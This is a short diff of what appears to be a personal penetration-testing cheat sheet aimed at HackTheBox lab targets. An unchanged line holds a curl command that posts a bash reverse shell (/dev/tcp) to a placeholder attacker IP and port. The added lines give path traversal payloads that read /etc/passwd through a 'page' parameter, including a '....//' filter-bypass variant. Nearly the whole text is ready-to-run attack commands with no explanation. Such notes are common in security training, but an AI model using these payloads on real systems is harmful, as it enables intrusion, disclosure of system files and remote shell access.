@@ -13,3 +13,12 @@
 
 
 ::: curl -s -X requestMethod "http://$(mvnb)/........" -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/ip_vpn_here/port_vpn_here 0>&1"'
+
+
+
+
+*** *** PATH
+
+	::: curl -s -X GET "http://targed_url_here.htb/index.php?page=....//....//....//....//....//....//....//etc/passwd"
+
+	::: curl -s -X GET "http://targed_url_here.htb/index.php?page=../../../../../../../etc/passwd"  --path-as-is			...<3 <3 <3
